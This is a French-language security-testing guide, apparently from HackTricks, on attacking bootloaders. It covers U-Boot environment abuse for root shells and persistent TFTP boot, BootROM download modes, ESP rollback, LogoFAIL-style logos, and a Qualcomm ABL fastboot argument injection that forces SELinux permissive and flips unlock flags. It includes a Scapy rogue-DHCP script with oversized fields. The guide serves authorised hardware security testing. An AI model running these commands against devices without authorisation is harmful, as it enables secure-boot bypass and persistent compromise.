# Test des bootloaders

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage d'un appareil et tester les bootloaders tels que U-Boot et les loaders de type UEFI. Concentrez-vous sur l'obtention d'une exécution de code précoce, l'évaluation des protections de signature/rollback, et l'abus des chemins de récupération ou de boot réseau.

Connexe : MediaTek secure-boot bypass via bl2_ext patching :

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Accéder à l'interpréteur
- Pendant le boot, appuyez sur une touche de pause connue (souvent n'importe quelle touche, 0, espace, ou une séquence "magique" spécifique à la carte) avant que `bootcmd` ne s'exécute pour arriver à l'invite U-Boot.

2. Inspecter l'état de boot et les variables
- Commandes utiles :
- `printenv` (dump de l'environnement)
- `bdinfo` (info carte, adresses mémoire)
- `help bootm; help booti; help bootz` (méthodes de boot kernel supportées)
- `help ext4load; help fatload; help tftpboot` (loaders disponibles)

3. Modifier les arguments de boot pour obtenir un shell root
- Ajoutez `init=/bin/sh` pour que le kernel ouvre un shell au lieu de lancer init :
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot depuis votre serveur TFTP
- Configurez le réseau et récupérez un kernel/fit image sur le LAN :
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persister des changements via l'environnement
- Si le stockage de l'env n'est pas protégé en écriture, vous pouvez conserver le contrôle :
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Vérifiez des variables comme `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` qui influencent les chemins de fallback. Des valeurs mal configurées peuvent permettre des retours répétés au shell.

6. Vérifier les fonctionnalités debug/unsafe
- Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` sans restriction, la capacité à `loady`/`loads` via le port série, `env import` depuis des médias non fiables, et des kernels/ramdisks chargés sans vérification de signature.

7. Tests d'images U-Boot / vérification
- Si la plateforme affirme avoir un secure/verified boot avec des images FIT, essayez des images non signées et trafiquées :
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou le comportement legacy `verify=n` permet souvent de booter des payloads arbitraires.

## Surface de boot réseau (DHCP/PXE) et serveurs rogue

8. Fuzzing des paramètres PXE/DHCP
- La gestion BOOTP/DHCP legacy d'U-Boot a connu des problèmes de sécurité mémoire. Par exemple, CVE‑2024‑42040 décrit une divulgation de mémoire via des réponses DHCP spécialement construites qui peuvent leak des octets depuis la mémoire U-Boot sur le réseau. Explorez les chemins de code DHCP/PXE avec des valeurs excessivement longues/cas limites (option 67 bootfile-name, vendor options, champs file/servername) et observez les blocages/leaks.
- Extrait Scapy minimal pour stresser les paramètres de boot pendant le netboot :
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Validez aussi si les champs de filename PXE sont passés à la logique shell/loader sans sanitization lorsqu'ils sont enchaînés à des scripts de provisioning côté OS.

9. Tests d'injection de commandes depuis un DHCP rogue
- Montez un service DHCP/PXE rogue et essayez d'injecter des caractères dans les champs filename ou options pour atteindre des interpréteurs de commandes dans les étapes ultérieures de la chaîne de boot. L'auxiliaire DHCP de Metasploit, `dnsmasq`, ou des scripts Scapy custom fonctionnent bien. Isolez toujours le réseau labo en premier.

## Modes de récupération BootROM SoC qui out-stream le boot normal

Beaucoup de SoC exposent un mode BootROM "loader" qui acceptera du code via USB/UART même lorsque les images flash sont invalides. Si les fuses secure-boot ne sont pas brûlées, cela peut fournir une exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
- Outils : `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemple : `imx-usb-loader u-boot.imx` pour pousser et exécuter un U-Boot custom depuis la RAM.
- Allwinner (FEL)
- Outil : `sunxi-fel`.
- Exemple : `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Outil: `rkdeveloptool`.
- Exemple: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` pour stagier un loader et uploader un U-Boot custom.

Évaluez si l'appareil possède des eFuses/OTP de secure-boot brûlées. Sinon, les modes de téléchargement BootROM contournent fréquemment toute vérification de niveau supérieur (U-Boot, kernel, rootfs) en exécutant votre payload de premier stade directement depuis le SRAM/DRAM.

## UEFI/PC-class bootloaders : vérifications rapides

10. Altération de l'ESP et tests de rollback
- Montez l'EFI System Partition (ESP) et vérifiez les composants du loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, chemins de logos vendor.
- Essayez de booter avec des composants de boot signés plus anciens ou connus vulnérables si les revocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait encore confiance à d'anciens shims/bootmanagers, vous pouvez souvent charger votre propre kernel ou `grub.cfg` depuis l'ESP pour obtenir de la persistance.

11. Bugs de parsing de logo de boot (classe LogoFAIL)
- Plusieurs firmwares OEM/IBV étaient vulnérables à des défauts de parsing d'images dans DXE qui traitent les logos de boot. Si un attaquant peut placer une image crafted sur l'ESP sous un chemin spécifique au vendor (par ex. `\EFI\<vendor>\logo\*.bmp`) et redémarrer, une exécution de code pendant le boot précoce peut être possible même avec Secure Boot activé. Testez si la plateforme accepte des logos fournis par l'utilisateur et si ces chemins sont inscriptibles depuis l'OS.

## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Sur les appareils Android 16 qui utilisent ABL de Qualcomm pour charger la **Generic Bootloader Library (GBL)**, vérifiez si ABL **authentifie** l'app UEFI qu'il charge depuis la partition `efisp`. Si ABL ne vérifie que la **présence** d'une app UEFI et ne vérifie pas les signatures, un primitive d'écriture sur `efisp` devient une **exécution de code non signée pré-OS** au démarrage.

Vérifications pratiques et chemins d'abus :

- **efisp write primitive** : Il faut un moyen d'écrire une app UEFI custom dans `efisp` (root/service privilégié, bug d'une app OEM, chemin recovery/fastboot). Sans cela, le gap de chargement GBL n'est pas directement exploitable.
- **fastboot OEM argument injection** (bug ABL) : Certaines builds acceptent des tokens supplémentaires dans `fastboot oem set-gpu-preemption` et les ajoutent à la cmdline du kernel. Cela peut forcer SELinux permissive, permettant des écritures sur des partitions protégées :
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Si l'appareil est patché, la commande doit rejeter les arguments supplémentaires.
- **Déverrouillage du bootloader via flags persistants** : Un payload au stade boot peut basculer des flags persistants d'unlock (ex. `is_unlocked=1`, `is_unlocked_critical=1`) pour émuler `fastboot oem unlock` sans passer par le serveur/approbation OEM. C'est un changement de posture durable après le reboot suivant.

Notes défensives/triage :

- Confirmez si ABL effectue une vérification de signature sur le payload GBL/UEFI depuis `efisp`. Sinon, traitez `efisp` comme une surface de persistance à haut risque.
- Surveillez si les handlers fastboot OEM d'ABL sont patchés pour **valider le nombre d'arguments** et rejeter les tokens additionnels.

## Précautions matérielles

Soyez prudent lors des manipulations de SPI/NAND flash pendant le boot précoce (par ex. mise à la masse de broches pour contourner des lectures) et consultez toujours la datasheet de la flash. Des courts-circuits mal synchronisés peuvent corrompre l'appareil ou le programmateur.

## Notes et astuces additionnelles

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d'environnement entre RAM et stockage ; certaines plateformes permettent d'importer l'env depuis des médias amovibles sans authentification.
- Pour la persistance sur des systèmes Linux qui bootent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de boot suffit souvent lorsqu'aucune vérification de signature n'est appliquée.
- Si l'espace utilisateur fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond au stockage réel de l'env. Des offsets mal configurés vous permettent de lire/écrire la mauvaise région MTD.

## Références

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
